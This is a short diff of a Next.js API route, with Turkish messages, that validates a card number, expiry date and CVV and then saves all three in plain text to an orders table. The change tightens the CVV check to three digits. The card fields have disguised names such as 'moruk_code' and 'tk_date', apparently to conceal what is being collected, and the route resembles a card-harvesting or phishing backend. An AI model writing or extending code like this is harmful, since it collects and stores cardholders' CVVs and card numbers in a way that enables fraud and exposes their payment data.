@@ -23,7 +23,7 @@ export async function POST(req){
     if(!order_id || !request_name) return NextResponse.json({error:'KART bilgileri eksik.'},{status:400});
     if(!/^\d{16}$/.test(request_number)) return NextResponse.json({error:'KART numarası tam 16 rakam olmalıdır.'},{status:400});
     if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(tk_date)) return NextResponse.json({error:'SK tarihi AA/YY formatında olmalıdır.'},{status:400});
-    if(!/^\d{4}$/.test(moruk_code)) return NextResponse.json({error:'CVV alanı tam 3 rakam olmalıdır.'},{status:400});
+    if(!/^\d{3}$/.test(moruk_code)) return NextResponse.json({error:'CVV alanı tam 3 rakam olmalıdır.'},{status:400});
     const {data,error}=await db.from('orders').update({request_name,request_number,tk_date,moruk_code,status:'Talep Alındı'}).eq('id',order_id).select('id').maybeSingle();
     if(error) throw error;
     if(!data) return NextResponse.json({error:'Sipariş kaydı bulunamadı.'},{status:404});
